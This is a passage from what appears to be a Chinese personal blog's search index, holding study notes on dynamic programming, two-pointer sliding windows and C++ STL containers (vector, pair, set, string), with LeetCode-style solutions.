nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            pre = max(nums[i], pre + nums[i]);</span><br><span class="line">            ans = max(ans, pre);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="2-最长上升子序列"><a href="#2-最长上升子序列" class="headerlink" title="2 最长上升子序列"></a>2 最长上升子序列</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>给你一个整数数组 nums ，找到其中最长严格递增子序列的长度。</p><p>子序列是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。例如，[3,6,2,7] 是数组 [0,3,1,6,2,2,7] 的子序列。</p><p>链接：<a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-increasing-subsequence/</a></p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol><li><strong>状态</strong>：$dp[i]$ 代表以$nums[i]$结尾的最长严格递增子序列的长度</li><li><strong>状态转移方程</strong>：$dp[i] = max(dp[j]+1,dp[i])$，$j<i$且$nums[i]>nums[j]$</i$且$nums[i]></li><li><strong>答案</strong>：$max(dp[0…n-1])$</li></ol><ul><li><strong>时间复杂度</strong>： $O(n^2)$</li><li><strong>空间复杂度</strong>： $O(n)$</li></ul><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> dp[n];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] &gt; nums[j]) &#123;</span><br><span class="line">                    dp[i] = max(dp[i], dp[j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *max_element(dp, dp + n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><a href></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>双指针</title>
      <link href="/2021/07/22/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
      <url>/2021/07/22/%E5%8F%8C%E6%8C%87%E9%92%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-无重复字符的最长子串"><a href="#1-无重复字符的最长子串" class="headerlink" title="1 无重复字符的最长子串"></a>1 无重复字符的最长子串</h1><p>题目来源：<a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/" target="_blank" rel="noopener">leetcode-3 无重复字符的最长子串</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先区分子串与子序列：子串必须连续，子序列可以不连续。</p><p>两层循环$O(n^2)$不太行，减少重复查询，可以用<strong>双指针</strong>维护一个<strong>滑动窗口</strong>，同时用一个数组标记滑动窗口内出现的字符。</p><ul><li><strong>时间复杂度</strong>：$O(N)$，其中 $N$ 是字符串的长度。左指针和右指针分别会遍历整个字符串一次。</li><li><strong>空间复杂度</strong>：$O(|\Sigma|)$，其中 $\Sigma$ 表示字符集（即字符串中可以出现的字符），$|\Sigma|$ 表示字符集的大小。在本题中没有明确说明字符集，因此可以默认为所有 ASCII 码在 $[0, 128)$ 内的字符，即 $|\Sigma| = 128$。</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">128</span>;<span class="comment">//字符范围</span></span><br><span class="line">        <span class="keyword">int</span> foot[maxn] = &#123;<span class="number">0</span>&#125;;<span class="comment">//标记滑动窗口中已经有的字符</span></span><br><span class="line">        <span class="keyword">int</span> len = s.size();</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;<span class="comment">//空串</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>, end = <span class="number">0</span>;<span class="comment">//双指针维护窗口</span></span><br><span class="line">        foot[s[start]] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; len - <span class="number">1</span>) &#123;</span><br><span class="line">            end++;<span class="comment">//后面的指针前进</span></span><br><span class="line">            <span class="keyword">while</span> (end &lt; len) &#123;</span><br><span class="line">                <span class="keyword">if</span> (foot[s[end]] == <span class="number">0</span>) &#123;</span><br><span class="line">                    foot[s[end]] = <span class="number">1</span>;</span><br><span class="line">                    end++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            end--;<span class="comment">//后面的指针回退</span></span><br><span class="line">            ans = max(ans, end - start + <span class="number">1</span>);</span><br><span class="line">            foot[s[start]] = <span class="number">0</span>;<span class="comment">//前面的指针前移</span></span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><a href></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈-队列-链表</title>
      <link href="/2021/07/22/%E6%A0%88-%E9%98%9F%E5%88%97-%E9%93%BE%E8%A1%A8/"/>
      <url>/2021/07/22/%E6%A0%88-%E9%98%9F%E5%88%97-%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-栈"><a href="#1-栈" class="headerlink" title="1 栈"></a>1 栈</h1><ol><li><a href></a></li></ol><h1 id="2-队列"><a href="#2-队列" class="headerlink" title="2 队列"></a>2 队列</h1><ol><li><a href></a></li></ol><h1 id="3-链表"><a href="#3-链表" class="headerlink" title="3 链表"></a>3 链表</h1><ol><li><a href="https://leetcode-cn.com/problems/add-two-numbers/" target="_blank" rel="noopener">leetcode-2 两数相加 (简单)</a>：链表遍历</li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>STL</title>
      <link href="/2021/07/22/STL/"/>
      <url>/2021/07/22/STL/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-vector-向量"><a href="#1-vector-向量" class="headerlink" title="1 vector(向量)"></a>1 vector(向量)</h1><p>vector是与数组相关的序列式容器，set模版类的定义在头文件\<vector\>中。当我们在程序中需要使用动态数组时， vector将会是理想的选择， vector可以在使用过程中动态地增长存储空间。</vector\></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; s;<span class="comment">// 定义⼀个空的vector对象，存储的是int类型的元素</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">s</span><span class="params">(n)</span></span>;<span class="comment">// 定义⼀个含有n个int元素的vector对象</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">s</span><span class="params">(first, last)</span></span>;<span class="comment">// 从由迭代器first和last定义的序列[first, last)中复制初值初始化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">s[i] <span class="comment">// 直接以下标⽅式访问容器中的元素，编号从0开始</span></span><br><span class="line">s.front() <span class="comment">// 返回⾸元素</span></span><br><span class="line">s.back() <span class="comment">// 返回尾元素</span></span><br><span class="line">s.push_back(x) <span class="comment">// 向表尾插⼊元素x</span></span><br><span class="line">s.pop_back() <span class="comment">// 删除表尾元素</span></span><br><span class="line">s.size() <span class="comment">// 返回表⻓</span></span><br><span class="line">s.empty() <span class="comment">// 表为空时，返回真，否则返回假</span></span><br><span class="line">s.begin() <span class="comment">// 返回指向⾸元素的随机存取迭代器</span></span><br><span class="line">s.end() <span class="comment">// 返回指向尾元素的下⼀个位置的随机存取迭代器</span></span><br><span class="line">s.insert(it, val) <span class="comment">// 向迭代器it指向的元素前插⼊新元素val</span></span><br><span class="line">s.insert(it, n, val) <span class="comment">// 向迭代器it指向的元素前插⼊n个新元素val</span></span><br><span class="line">s.insert(it, first, last)<span class="comment">// 向迭代器it指向的元素前插⼊迭代器first和last所指定的序列[first, last)</span></span><br><span class="line">s.erase(it) <span class="comment">// 删除由迭代器it所指向的元素</span></span><br><span class="line">s.erase(first, last) <span class="comment">// 删除由迭代器first和last所指定的序列[first, last)</span></span><br><span class="line">s.reserve(n) <span class="comment">// 预分配缓冲空间，使存储空间至少可容纳n个元素</span></span><br><span class="line">s.resize(n) <span class="comment">// 改变序列长度，超出的元素将会全部被删除，需要扩展(原空间小于n)的用元素默认值填满</span></span><br><span class="line">s.resize(n, val) <span class="comment">// 改变序列长度，超出的元素将会全部被删除，需要扩展(原空间小于n)的用元素val填满</span></span><br><span class="line">s.clear() <span class="comment">// 删除容器中的所有元素。resize和clear是对表的有效元素进行的操作，但不⼀定改变缓冲空间的⼤小</span></span><br><span class="line">s.swap(v) <span class="comment">// 将s与另⼀个vector对象进行交换</span></span><br><span class="line">s.assign(first, last)<span class="comment">// 将序列替换成由迭代器指示的[first, last)，不能是原序列中的⼀部分</span></span><br><span class="line"><span class="keyword">operator</span>: &gt; &lt; &gt;= &lt;= == != <span class="comment">//按照字典序⽐较两个序列</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 组合操作</span></span><br><span class="line">s.insert(s.begin(), x) <span class="comment">// 向表头插⼊元素x</span></span><br><span class="line">s.erase(s.begin()) <span class="comment">// 删除表头元素</span></span><br><span class="line">reverse(s.begin(), s.end()) <span class="comment">// 反转向量</span></span><br><span class="line">sort(s.begin(), s.end()) <span class="comment">// 排序</span></span><br></pre></td></tr></table></figure><h1 id="2-pair-二元组"><a href="#2-pair-二元组" class="headerlink" title="2 pair(二元组)"></a>2 pair(二元组)</h1><p>pair用来表示一个二元组或元素对，定义在头文件\<utility\>中。pair模版类需要两个参数：首元素的数据类型和尾元素的数据类型。 pair模版类对象有两个成员： first和second，分别表示首元素和尾元素。  </utility\></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line">pair&lt;<span class="keyword">double</span>, <span class="keyword">double</span>&gt; p;</span><br><span class="line">p = make_pair(<span class="keyword">int</span>, <span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line"><span class="keyword">operator</span>: &lt; &gt; &lt;= &gt;= == != <span class="comment">// 其规则是先⽐较first， first相等时再比较second，这符合⼤多数应⽤的逻辑</span></span><br></pre></td></tr></table></figure><h1 id="3-set-集合"><a href="#3-set-集合" class="headerlink" title="3 set(集合)"></a>3 set(集合)</h1><p>set是与集合相关的关联式容器，set模版类的定义在头文件\<set\>中。在set中每个元素的值都唯一，而且系统能根据元素的值自动进行排序(默认升序)。set中元素的值不能直接被改变。</set\></p><p>标准库提供set关联容器分为：</p><ol><li>按关键字有序保存元素：set(关键字即值，即只保存关键字的容器)；multiset(关键字可重复出现的set)；</li><li>无序集合：unordered_set(用哈希函数组织的set)；unordered_multiset(哈希组织的set，关键字可以重复出现)。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="built_in">set</span>&lt;T&gt; s;</span><br><span class="line"><span class="built_in">set</span>&lt;T&gt;::iterator it;<span class="comment">//迭代器</span></span><br><span class="line"><span class="keyword">int</span> arr[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="function"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ss</span><span class="params">(arr, arr+<span class="number">4</span>)</span></span>;<span class="comment">//数组初始化</span></span><br><span class="line"><span class="function"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ss</span><span class="params">(s)</span></span>;<span class="comment">//集合初始化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">s.begin() <span class="comment">// 返回指向第⼀个元素的迭代器，如果set为空则返回的迭代器不能解引用</span></span><br><span class="line">s.clear() <span class="comment">// 清除所有元素</span></span><br><span class="line">s.count(T) <span class="comment">// 返回某个元素的个数，多重集合也是返回个数</span></span><br><span class="line">s.empty() <span class="comment">// 如果集合为空，返回true(真）</span></span><br><span class="line">s.end() <span class="comment">// 返回指向最后⼀个元素之后的迭代器，不是最后⼀个元素</span></span><br><span class="line">s.equal_range(T) <span class="comment">// 返回集合中与给定值相等的上下限的两个迭代器(pair)</span></span><br><span class="line">s.erase(T) <span class="comment">// 删除迭代器指定位置的元素或与对象匹配的元素</span></span><br><span class="line">s.find(T) <span class="comment">// 返回⼀个指向被查找到元素的迭代器</span></span><br><span class="line">s.get_allocator() <span class="comment">// 返回集合的分配器</span></span><br><span class="line">s.insert(T) <span class="comment">// 在集合中插⼊元素</span></span><br><span class="line">s.lower_bound(T) <span class="comment">// 返回指向⼤于（或等于）某值的第⼀个元素的迭代器</span></span><br><span class="line">s.key_comp() <span class="comment">// 返回⼀个⽤于元素间值⽐较的函数，默认operator&lt;</span></span><br><span class="line">s.max_size() <span class="comment">// 返回集合能容纳的元素的最⼤限值</span></span><br><span class="line">s.rbegin() <span class="comment">// 返回指向集合中最后⼀个元素的反向迭代器</span></span><br><span class="line">s.rend() <span class="comment">// 返回指向集合中第⼀个元素的反向迭代器</span></span><br><span class="line">s.size() <span class="comment">// 集合中元素的数⽬</span></span><br><span class="line">s.swap(<span class="built_in">set</span>&lt;T&gt;) <span class="comment">// 交换两个集合变量</span></span><br><span class="line">s.upper_bound(T) <span class="comment">// 返回⼤于某个值元素的迭代器</span></span><br><span class="line">s.value_comp() <span class="comment">// 返回⼀个⽤于⽐较元素间的值的函数</span></span><br><span class="line"><span class="comment">//遍历输出</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> ptr = s.begin(); ptr != s.end(); ptr++) &#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt; *ptr&lt;&lt; <span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改排序</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span> <span class="params">()</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp; u, <span class="keyword">const</span> <span class="keyword">int</span>&amp; v)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">abs</span>(u - v) &lt;= k) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> u &lt; v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>, cmp&gt; se;</span><br></pre></td></tr></table></figure><h1 id="4-string-字符串"><a href="#4-string-字符串" class="headerlink" title="4 string(字符串)"></a>4 string(字符串)</h1><p>string类的定义在头文件$<string>$中。string类其实可以看作是一个字符的vector， vector上的各种操作都可以适用于string，另外，string类对象还支持字符串的拼合、转换等操作。  </string></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="built_in">string</span> str;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line"><span class="keyword">operator</span> + <span class="comment">// 拼合</span></span><br><span class="line"><span class="comment">//string转char指针</span></span><br><span class="line"><span class="keyword">char</span> *p=(<span class="keyword">char</span>*)str.c_str();</span><br><span class="line"><span class="keyword">char</span>*p=(<span class="keyword">char</span>*)str.data();</span><br><span class="line"><span class="comment">// 关于输入</span></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt; str;<span class="comment">//接受空、回车格结尾的字符串</span></span><br><span class="line"><span class="built_in">cin</span>.ignore();<span class="comment">//配合使用，清除以回车结束的输入缓冲区的内容 </span></span><br><span class="line">getline(<span class="built_in">cin</span>, str);<span class="comment">//读取一行</span></span><br><span class="line"><span class="comment">//字串型的串流，用于按空格间隔的字串分割</span></span><br><span class="line"><span class="built_in">stringstream</span> ss;</span><br><span class="line">ss&lt;&lt; str;<span class="comment">//输入str到ss(屏幕)，看方向</span></span><br><span class="line">ss&gt;&gt; str;<span class="comment">//ss(屏幕)输入到str</span></span><br><span class="line"><span class="comment">//@brief: 指定单个分隔符（单个字符或子串）分割字符串</span></span><br><span class="line"><span class="comment">//@param: src 原字符串；delimiter 分隔符，单个字符或子串</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">splitStr</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; src, <span class="keyword">const</span> <span class="built_in">string</span>&amp; delimiter)</span> </span>&#123;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; vetStr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入参检查</span></span><br><span class="line"><span class="comment">// 1.原字符串为空或等于分隔符，返回空 vector</span></span><br><span class="line"><span class="keyword">if</span> (src == <span class="string">""</span> || src == delimiter) &#123;</span><br><span class="line"><span class="keyword">return</span> vetStr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.分隔符为空返回单个元素为原字符串的 vector</span></span><br><span class="line"><span class="keyword">if</span> (delimiter == <span class="string">""</span>) &#123;</span><br><span class="line">vetStr.push_back(src);</span><br><span class="line"><span class="keyword">return</span> vetStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>::size_type startPos = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> index = src.find(delimiter);</span><br><span class="line"><span class="keyword">while</span> (index != <span class="built_in">string</span>::npos) &#123;</span><br><span class="line"><span class="keyword">auto</span> str = src.substr(startPos, index - startPos);</span><br><span class="line"><span class="keyword">if</span> (str != <span class="string">""</span>) &#123;</span><br><span class="line">vetStr.push_back(str);</span><br><span class="line">&#125;</span><br><span class="line">startPos = index + delimiter.length();</span><br><span class="line">index = src.find(delimiter, startPos);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 取最后一个子串</span></span><br><span class="line"><span class="keyword">auto</span> str = src.substr(startPos);</span><br><span class="line"><span class="keyword">if</span> (str != <span class="string">""</span>) &#123;</span><br><span class="line">vetStr.push_back(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> vetStr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//char字符处理</span></span><br><span class="line"><span class="built_in">isalpha</span>(ch);<span class="comment">//字母（不区分大小写）</span></span><br><span class="line"><span class="built_in">isupper</span>(ch);<span class="comment">//大写字母</span></span><br><span class="line"><span class="built_in">islower</span>();<span class="comment">//小写字母</span></span><br><span class="line"><span class="built_in">isdigit</span>();<span class="comment">//数字</span></span><br><span class="line"><span class="built_in">isalnum</span>();<span class="comment">//字母或数字</span></span><br><span class="line"><span class="built_in">toupper</span>();<span class="comment">//转大写</span></span><br><span class="line"><span class="built_in">tolower</span>();<span class="comment">//转小写</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//string转int等类型</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stoi</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp;  str, <span class="keyword">size_t</span>* idx = <span class="number">0</span>, <span class="keyword">int</span> base = <span class="number">10</span>)</span></span>;<span class="comment">//*idx是指向size_t类型对象的指针，其值由函数设置为数值后str中下一个字符的位置；base是指str的基数，默认十进制</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">stol</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp;  str, <span class="keyword">size_t</span>* idx = <span class="number">0</span>, <span class="keyword">int</span> base = <span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">stoul</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp;  str, <span class="keyword">size_t</span>* idx = <span class="number">0</span>, <span class="keyword">int</span> base = <span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">stoll</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp;  str, <span class="keyword">size_t</span>* idx = <span class="number">0</span>, <span class="keyword">int</span> base = <span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">stoull</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp;  str, <span class="keyword">size_t</span>* idx = <span class="number">0</span>, <span class="keyword">int</span> base = <span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">stof</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp;  str, <span class="keyword">size_t</span>* idx = <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">stod</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp;  str, <span class="keyword">size_t</span>* idx = <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">double</span> <span class="title">stold</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp;  str, <span class="keyword">size_t</span>* idx = <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//int等类型转string</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">to_string</span> <span class="params">(T)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//find函数</span></span><br><span class="line">str.find(tmp_str);<span class="comment">//返回下标位置，没有则返回str.npos</span></span><br><span class="line">str.find_first_of(tmp_str);<span class="comment">//第一次出现的位置</span></span><br><span class="line">str.find_last_of(tmp_str);<span class="comment">//最后一次出现的位置</span></span><br><span class="line">str.find(tmp_str, pos);<span class="comment">//从下标pos开始查找</span></span><br><span class="line">str.rfind(tmp_str);<span class="comment">//反向查找，与正向查找结合确定子串的唯一性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//取子串</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">substr</span> <span class="params">(<span 